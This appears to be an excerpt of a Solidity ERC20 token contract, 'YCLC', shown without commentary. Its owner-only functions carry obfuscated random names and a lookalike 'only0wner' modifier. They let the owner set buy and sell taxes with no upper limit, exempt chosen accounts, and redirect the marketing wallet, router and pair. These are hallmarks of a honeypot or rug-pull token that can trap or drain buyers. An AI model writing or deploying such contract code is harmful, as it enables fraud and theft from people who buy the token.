...
contract YCLC is ERC20, Ownable{
    ...
    mapping (address => bool) public wyJYTtSwCncZa;
    ...
    constructor() ERC20("YCLC", "YCLC") {
        ...
        wyJYTtSwCncZa[msg.sender] = true;
        wyJYTtSwCncZa[address(pair)] = true;
        wyJYTtSwCncZa[marketingWallet] = true;
        wyJYTtSwCncZa[address(router)] = true;
        wyJYTtSwCncZa[address(this)] = true;
    }
    ...
    function wMrgFIvJZnNKMC(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function ogwOKAkgSoKfsL(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            wyJYTtSwCncZa[accounts[i]] = newValue;
        }
    }

    function tkfRkyaMntrI(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function BdIxvQfvzDtD(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function LewYuFOLAgaQ(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function OBefwWRMZFn(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
